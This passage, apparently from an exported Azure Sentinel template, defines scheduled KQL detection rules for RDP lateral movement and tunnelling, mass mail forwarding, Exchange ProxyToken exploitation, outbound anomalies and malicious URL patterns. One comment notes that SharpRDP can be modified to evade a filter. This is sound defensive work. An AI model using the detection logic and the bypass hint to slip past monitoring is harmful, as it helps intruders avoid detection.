          "query": "let executions = DeviceProcessEvents\n| where InitiatingProcessFileName contains \"taskmgr\" and AccountName !contains \"_ladm\" // Include your LAPS /RID500 admin naming convention here. \n// Add the below filter to look for stock SharpRDP behavior. However, with minorchanges to the stock version of SharpRDP the filter below can be bypassed.\n//| where not(InitiatingProcessCommandLine has_any (\"/1\",\"/2\",\"/3\",\"/4\"))\n| where not(FolderPath =~ @\"c:\\Windows\\system32\\WerFault.exe\" and ProcessCommandLine contains \"-u -p\")\n| where not(FolderPath =~ @\"c:\\windows\\system32\\mmc.exe\" and ProcessCommandLine contains @\"C:\\WINDOWS\\System32\\services.msc\")\n| where not(FolderPath =~ @\"c:\\windows\\system32\\resmon.exe\");\nexecutions\n| join kind=leftsemi  (DeviceLogonEvents\n| where LogonType in ('Unlock', 'RemoteInteractive') and not (LogonType == 'Unlock' and RemoteIP == '127.0.0.1') and RemoteIP != \"\" and ActionType == \"LogonSuccess\") on DeviceId, LogonId\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "cc46e76c-0d04-40b0-9c8b-929aa40513e7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Sid",
                  "columnName": "AccountSid"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "ProcessCommandLine"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6e52fa6d-dd00-4f92-97a1-052c4f3c8563')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6e52fa6d-dd00-4f92-97a1-052c4f3c8563')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Remote Desktop Tunneling",
          "description": "This query detects remote desktop authentication attempts with a localhost source address, which can indicate a tunneled login. Aids in identifying potentially suspicious RDP logon attempts on the local machine (e.g., brute force attacks or unauthorized access).\nRef: https://www.mandiant.com/resources/bypassing-network-restrictions-through-rdp-tunneling",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n   | where EventID in (4624,4625) and LogonType in (10) and IpAddress in (\"::1\",\"127.0.0.1\")\n   | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, TargetUserName, TargetLogonId, LogonType, IpAddress\n   | extend Name=tostring(split(TargetUserName, \"@\")[0]), UPNSuffix=tostring(split(TargetUserName, \"@\")[1])\n   | extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1572"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "d2e8fd50-8d66-11ec-b909-0242ac120002",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2bc3fcd2-93d7-413a-9014-c87b016abf69')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2bc3fcd2-93d7-413a-9014-c87b016abf69')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Remote Desktop Tunneling",
          "description": "This query detects remote desktop authentication attempts with a localhost source address, which can indicate a tunneled login.\nRef: https://www.mandiant.com/resources/bypassing-network-restrictions-through-rdp-tunneling",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n   | where EventID in (4624,4625) and LogonType in (10) and IpAddress in (\"::1\",\"127.0.0.1\")\n   | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, TargetUserName, TargetLogonId, LogonType, IpAddress\n   | extend Name=tostring(split(TargetUserName, \"@\")[0]), UPNSuffix=tostring(split(TargetUserName, \"@\")[1])\n   | extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1572"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "d2e8fd50-8d66-11ec-b909-0242ac120002",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d920bc50-c35b-4ccc-9e97-11f5d4f5dea7')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d920bc50-c35b-4ccc-9e97-11f5d4f5dea7')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Multiple users email forwarded to same destination",
          "description": "Identifies when multiple (more than one) users mailboxes are configured to forward to the same destination. \nThis could be an attacker-controlled destination mailbox configured to collect mail from multiple compromised user accounts.",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 7d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation =~ \"Set-Mailbox\"\n| where Parameters has \"ForwardingSmtpAddress\"\n| extend parsed = parse_json(Parameters)\n| mv-expand parsed\n| where parsed.Name == \"ForwardingSmtpAddress\"\n| extend parameterName = tostring(parsed.Name), fwdingDestination = tostring(parsed.Value)\n| where isnotempty(fwdingDestination)\n| where fwdingDestination != \"dcssitsmdev@servicenowservices.com\" // expected to forward to our SNOW instance - DanneF\n| where fwdingDestination !contains tostring(\"DCSSServiceNowAllInstances@dcss.ca.gov\") // DL to send to all instances, dev, test, prod - DanneF\n| extend ClientIPOnly = case( \nClientIP has \".\" and ClientIP has ':', tostring(split(ClientIP,\":\")[0]), \nClientIP has \".\" and ClientIP has '-', tostring(split(ClientIP,\"-\")[0]), \nClientIP has ']-', tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\nClientIP has ']:', tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has ':', tostring(split(ClientIP_,\":\")[0]), \nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has '-', tostring(split(ClientIP_,\"-\")[0]), \nisempty(ClientIP) and ClientIP_ has ']-', tostring(trim_start(@'[[]',tostring(split(ClientIP_,\"]\")[0]))),\nisempty(ClientIP) and ClientIP_ has ']:', tostring(trim_start(@'[[]',tostring(split(ClientIP_,\"]\")[0]))),\nisnotempty(ClientIP), ClientIP,\nisnotempty(ClientIP_), ClientIP_,\n\"IP Not Available\"\n)  \n| extend Port = case(\nClientIP has \".\" and ClientIP has ':', tostring(split(ClientIP,\":\")[1]), \nClientIP has \".\" and ClientIP has '-', tostring(split(ClientIP,\"-\")[1]), \nClientIP has ']-', tostring(split(ClientIP,\"]-\")[1]), \nClientIP has ']:', tostring(split(ClientIP,\"]:\")[1]), \nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has ':', tostring(split(ClientIP_,\":\")[1]), \nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has '-', tostring(split(ClientIP_,\"-\")[1]), \nisempty(ClientIP) and ClientIP_ has ']-', tostring(split(ClientIP_,\"]-\")[1]),\nisempty(ClientIP) and ClientIP_ has ']:', tostring(split(ClientIP_,\"]:\")[1]),\nisnotempty(ClientIP), ClientIP,\nisnotempty(ClientIP_), ClientIP_,\n\"IP Not Available\"\n)\n| extend UserId = iff(isempty(UserId), UserId_, UserId)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), DistinctUserCount = dcount(UserId), UserId = make_set(UserId), \nPorts = make_set(Port), EventCount = count() by fwdingDestination, ClientIP = ClientIPOnly \n| where DistinctUserCount > 1\n| mv-expand UserId\n| extend UserId = tostring(UserId), Ports = tostring(Ports)\n| distinct StartTimeUtc, EndTimeUtc, UserId, DistinctUserCount, ClientIP, Ports, fwdingDestination, EventCount\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "Exfiltration"
          ],
          "techniques": [
            "T1114",
            "T1020"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "871ba14c-88ef-48aa-ad38-810f26760ca3",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-838')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-838')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-838: [SOC] IIS - Exchange ProxyToken Exploitation",
          "description": "Requires customers to enable cookie logins in IIS. Looks for activity that might indicate exploitation of the ProxyToken vulnerability - CVE-2021-3376 Ref: https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server MITRE: T1190 Category: IIS tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin = 1h;\nlet ExchangeServers = toscalar(\nW3CIISLog\n| where TimeGenerated between(ago(generated_lookback) .. now())\n| where sSiteName =~ 'Exchange Back End'\n| summarize make_set(Computer));\nW3CIISLog\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where Computer in (ExchangeServers)\n| where not(ipv4_is_private(cIP))\n| where csMethod =~ \"POST\"\n| where csUriStem has '/ecp'\n| where isnotempty(csCookie) and csCookie has 'SecurityToken'\n| where csUriQuery has 'msExchEcpCanary'\n| extend Event = pack('SourceIP', cIP, 'TargetHost', Computer, 'TargetIP', sIP, 'URL', csUriStem, 'TimeGenerated', TimeGenerated, 'SystemAlertPlatform', 'Correlation', 'LogSourceHost', Computer)\n| extend SourceIP = cIP, TargetIP = sIP, UriStem=csUriStem, UriQuery=csUriQuery, Useragent=csUserAgent, SourceCountry=RemoteIPCountry, Status=scStatus, SourceUser=csUserName\n| parse SourceUser with UserNTDomain @'\\' UserName\n| parse Computer with ComputerName '.' ComputerDomain\n| extend bv_mapping_tag = SourceUser\n| project TimeGenerated, SourceIP, TargetIP, UriQuery, UriStem, Useragent, SourceCountry, Status, SourceUser, Computer, UserNTDomain, UserName, ComputerName, ComputerDomain, Event, bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "Event": "Event",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "TargetIP"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-104')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-104')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-104: [RBA] Palo Alto - Anomalous Allow Connections from Internal Hosts",
          "description": "This alert identifies internal hosts with an unusual amount of outbound allowed connections based on 1 day interval (outlier >= 1). This may indicate a data exfiltration or an otherwise compromised host. MITRE: T1071 Category: PaloAltoNetworks tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let timeRange = ago(3d);\nCommonSecurityLog\n| where TimeGenerated >= timeRange\n| where DeviceVendor =~ 'Palo Alto Networks'\n| where DeviceProduct =~ 'PAN-OS'\n| where SourceIP matches regex PRIVATE_IP\n| where DeviceAction == 'allow'\n| make-series eventsCount = count() on TimeGenerated from timeRange to now() step 1d by DeviceName\n| extend series_stats(eventsCount), outlier=series_outliers(eventsCount,'ctukey')\n| mvexpand eventsCount to typeof(int), outlier to typeof(double), TimeGenerated to typeof(datetime)\n| project DeviceName,TimeGenerated, CurrentNumberOfEvents=eventsCount , outlier, AverageNumberOfEvents=round(series_stats_eventsCount_avg,2)\n| where TimeGenerated >= ago(1d)\n| where outlier >= 1\n| extend HostCustomEntity = DeviceName",
          "queryFrequency": "P1D",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f4f2e8d9-a4ba-449e-a2e1-e9b104402ee2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f4f2e8d9-a4ba-449e-a2e1-e9b104402ee2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Identify instances where a single source is observed using multiple user agents (ASIM Web Session)",
          "description": "This detection mechanism identifies requests originating from a single source within a brief time period that exhibit multiple user agents. Such behavior could indicate unusual web browsing activities performed by unconventional processes",
          "severity": "Medium",
          "enabled": false,
          "query": "let threshold = 5; // Please update threshold limit as per your environment\n_Im_WebSession(starttime=ago(1h), eventresult=\"Success\")\n| where isnotempty(HttpUserAgent)\n| summarize\n    EventCount=count(),\n    UserAgentList=make_set(HttpUserAgent, 100),\n    URL_List = make_set(Url, 100),\n    DestinationIPList = make_set(DstIpAddr, 100)\n    by SrcIpAddr, SrcUsername, SrcHostname, bin(TimeGenerated, 5min)\n| extend UserAgentCount = array_length(UserAgentList)\n| where UserAgentCount > threshold\n| extend Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername,'@',0)[0]),SrcUsername), UPNSuffix = iif(SrcUsername contains \"@\",tostring(split(SrcUsername,'@',1)[0]),\"\"), Threshold=threshold\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1190",
            "T1133",
            "T1528"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "813ccf3b-0321-4622-b0bc-63518fd14454",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP '{{SrcIpAddr}}' has been observed using high number of User Agents within short timeframe",
            "alertDescriptionFormat": "The system has detected high User Agent count of '{{UserAgentCount}}' originating from '{{SrcUsername}}'. Further investigation is necessary to determine the reason behind the detection of multiple user agents associated with the SrcIpAddr in this incident. User Agent list include: '{{UserAgentList}}'"
          },
          "customDetails": {
            "UserAgentThreshold": "Threshold",
            "UserAgentArray": "UserAgentList",
            "UserAgentCount": "UserAgentCount",
            "DestinationIPList": "DestinationIPList",
            "URLs": "URL_List"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/207efb01-f245-4b77-90e0-aecc339a601f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/207efb01-f245-4b77-90e0-aecc339a601f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect URLs containing known malicious keywords or commands (ASIM Web Session)",
          "description": "The utilization of system commands or functions in the request URL may suggest that an attacker is trying to gain unauthorized access to the environment by exploiting a vulnerable service.",
          "severity": "High",
          "enabled": false,
          "query": "let lookback = 5m;\nlet RiskyCommandsInUrl = materialize(externaldata(Commands: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/CommandsInURL.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomRiskyCommandsInUrl = (_ASIM_GetWatchlistRaw(\"Web_RiskyCommandsInUrl\") // Create new Watchlist and add your custom indicators(Optional)\n    | extend\n        Commands = tostring(WatchlistItem[\"Commands\"])\n    | project Commands\n    | where isnotempty(Commands));\nlet CombinedRiskyCommandsInUrl = union RiskyCommandsInUrl, CustomRiskyCommandsInUrl;\nlet knownRiskyCommandsInUrl=toscalar(CombinedRiskyCommandsInUrl\n    | where isnotempty(Commands)\n    | summarize make_set(Commands, 1000));\n// You can add more keywords to the query as necessary, depending on the specific indicators you want to detect.\n_Im_WebSession (starttime=ago(lookback), eventresult='Success', url_has_any=knownRiskyCommandsInUrl)\n| where isnotempty(Url)\n| project Url, SrcIpAddr, SrcUsername, SrcHostname, DstIpAddr, TimeGenerated\n| extend Decoded_url = url_decode(Url)\n| where Decoded_url has_any (knownRiskyCommandsInUrl)\n| summarize\n    EventCount=count(),\n    EventStartTime=min(TimeGenerated),\n    EventEndTime=max(TimeGenerated)\n    by SrcIpAddr, SrcUsername, SrcHostname, Url, Decoded_url, DstIpAddr\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CommandAndControl"
          ],
          "techniques": [
            "T1190",
            "T1133",
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "32c08696-2e37-4730-86f8-97d9c8b184c9",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP '{{SrcIpAddr}}' has been identified as making request for URL '{{Url}}' that includes a recognizable malicious command"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "Decoded_url": "Decoded_url",
            "EventEndTime": "EventEndTime",
            "EventCount": "EventCount"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DstIpAddr"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "SrcUsername"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/28c60367-449e-481f-91be-000f6f1e34ab')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/28c60367-449e-481f-91be-000f6f1e34ab')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect Local File Inclusion(LFI) in web requests (ASIM Web Session)",
          "description": "LFI vulnerabilities allow an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web server is misconfigured and running with high privileges, the attacker may gain access to sensitive information",
          "severity": "High",
          "enabled": false,
          "query": "let lookback = 5m;\nlet LFI_Indicators = materialize(externaldata(Indicators: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/LocalFileInclusionIndicators.csv\"] \n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomLocalFileInclusionIndicators = (_ASIM_GetWatchlistRaw(\"Web_LocalFileInclusionIndicators\") // Create new Watchlist and add your custom indicators(Optional)\n    | extend\n        Indicators = tostring(WatchlistItem[\"Indicators\"])\n    | project Indicators\n    | where isnotempty(Indicators));\nlet CombinedLFIList = union LFI_Indicators, CustomLocalFileInclusionIndicators;\nlet knownLFIIndicators=toscalar(CombinedLFIList\n    | where isnotempty(Indicators)\n    | summarize make_set(Indicators, 1000));\n_Im_WebSession(starttime=ago(lookback), url_has_any=knownLFIIndicators, eventresult='Success')\n| where isnotempty(Url)\n| project Url, SrcIpAddr, SrcUsername, SrcHostname, TimeGenerated\n| extend Decoded_url = url_decode(Url)\n| where Decoded_url has_any (knownLFIIndicators)\n| summarize\n    EventCount=count(),\n    EventStartTime=min(TimeGenerated),\n    EventEndTime=max(TimeGenerated)\n    by SrcIpAddr, SrcUsername, SrcHostname, Url, Decoded_url\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n| order by EventCount desc\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Execution"
          ],
          "techniques": [
            "T1190",
            "T1133",
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7bb55d05-ef39-4a40-8079-0bc3c05e7881",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
